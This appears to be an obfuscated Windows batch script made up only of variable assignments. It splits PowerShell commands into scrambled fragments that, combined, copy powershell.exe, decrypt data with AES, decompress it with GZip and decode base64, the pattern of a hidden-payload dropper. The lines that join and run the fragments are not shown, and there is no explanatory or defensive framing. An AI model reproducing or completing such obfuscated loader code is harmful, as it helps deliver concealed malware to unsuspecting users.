@echo off
set "qoXDeRQKLE=32"
set "gTActKUFcq=st"
set "wCROmRVWYC=do"
set "EvFJVqGRUV= /"
set "VFWYWEIVCF=s\"
set "qsqoKCJeuA=ow"
set "trumXIKcZs=em"
set "TjTxsAtCTU=ws"
set "TUhwQVSWuT=he"
set "CTVRqEGPex=co"
set "rigWkzEeaU=po"
set "soRjaQAmia=xe"
set "LIJYVxraDC=we"
set "JBwNpFeegZ=he"
set "nGbVWZkzjz=nd"
set "rVdGeWCZnY=0\"
set "iwhWRooyJY=py"
set "saFFmrywNs=y "
set "dZSFsldnCC=1."
set "ckTMTcwPMT=Wi"
set "PCIvIQoozQ= C"
set "uzBGCgERgC=Sy"
set "pUzMEEgqnR=rs"
set "ECwLJxIurF=.e"
set "KdTlmcepIT=in"
set "NAbRivajFB=we"
set "MFMcBrsJCK=:\"
set "giVcrAjvSL=rS"
set "AjXrNvUvvi=\v"
set "wkFWOtibpW=ll"
set "HZnIRJmfKH=ll"
set "DQyNImvLrb=Po"
set "YSYRtceTEl=\W"
set "GHKVpMIUoH= %~dp0"
set "BhVVtfFnko=cd"
set "tSTZgaKWda=)($E"
set "NsJwkiqsqc=pStr"
set "UXrXWXgKDF=Syst"
set "ANylyWiYpt=.Cry"
set "QEvQnRUHMw=:: '"
set "ALOWQCfbKr=I = "
set "ivgleBLoYL=ode]"
set "QuZuvpehhW=]::("
set "HasjqFuPqH=6esa"
set "nbtumOzajR=.Dis"
set "FiPkpypLaf=1..-"
set "LDKBnUGjSS=Comp"
set "WEnkKNmRDU=, (,"
set "loobSfeAJW=nage"
set "nJxRIfXBgh=Obje"
set "yfvldQUqVo=ptog"
set "mdqznWlGCx=7Yiv"
set "COdxAJLamZ=3); "
set "LvCocdGcRY=ewLi"
set "qQTgiCEsmO='')("
set "RQviOeirEP=ment"
set "MKVWijMBNu=);$l"
set "qbIdxqSmpq=ck($"
set "CdBxZVTyqi=orF'"
set "mcqKoxQhXj=736u"
set "FqINibexhR=iron"
set "GsxcglchRd=m.IO"
set "DgyEXOTqeK=YK ="
set "GXOlaGzXZy=.Key"
set "CQxvVWIhQK=pDZz"
set "tLkXXjryTA=ne);"
set "uqcccYxtQL=aYkc"
set "pizVMvtcJd=gnir"
set "meqVHhVeSo=Fina"
set "FuALYveUCe=$SqH"
set "lpZnpFJnFA=.Cry"
set "ksbyYntbsM=BC;$"
set "TAqAqskYUw=t Sy"
set "cKDOZitQyK=]::C"
set "EmxlldPjIJ=yDLD"
set "PkYNutJJZK=comp"
set "oYNeAlnwxa=trea"
set "rVggOFjFkF=ose("
set "ytARAKsyQm== [S"
set "ZKgOmWtBBZ=O.Me"
set "hLFikRWRjr=BTyh"
set "JXEZpUdMqn=oL'["
set "vFjExPrzSx=ywxq"
set "yViSVOXNZj=]::("
set "xcmeilEihs=y.Cr"
set "HrpVLNjTlw=saBm"
set "ikIRKDQmTO= '')"
set "oIOBHSxwwq=PrZI"
set "gMZxAIIBgQ=sion"
set "YMtxwGARHX=Stre"
set "rylQvWlIVA=vert"
set "mfcAyIGQpc=rt]:"
set "aPNZPwHASB=in $"
set "srJJeritKK=;$yD"
set "yHUrLssvjh='gni"
set "COQyXQdCxF=;$Sq"
set "QPppnshTZi=.Sec"
set "KTZGKRSBOn=join"
set "wleymkVHes=[Sys"
set "DZYUUSQdfn=null"
set "PbsxiWCGkf=y]::"
set "zFxJCwzdUV=[Sys"
set "MFvPgKwIPz=th('"
set "yxcfMdpIOY=pres"
set "SOvxClwmyq=, $B"
set "krYLvlkdVd=grap"
set "WHdpvHbgBT=ew-O"
set "MChfIobvDD= [Sy"
set "LsZVIjHnQZ=y.Pa"
set "KcHLTkUhUi='txe"
set "FLHFvInNxW=oryS"
set "ZftgJBYmSJ=New-"
set "auSmVPGKvY=rity"
set "cyOYILUEmH=).Sp"
set "gxiTNbpdMC=PKCS"
set "raoPundJBi=; };"
set "VGeoNlvdQG=[Sys"
set "reXtUdsZmR=-1.."
set "JAEJqfwRkU=.Cre"
set "wWgcPJDUed=Bmor"
set "upgoBcfHJi= [Sy"
set "OpkJEQdRIp=.Len"
set "LxQsWniEYm=em.C"
set "nisymBRMjk=V = "
set "JpHlUVbCdE=daeR"
set "APttMJqtwT=:('g"
set "QBvNnzkyZq=BPrZ"
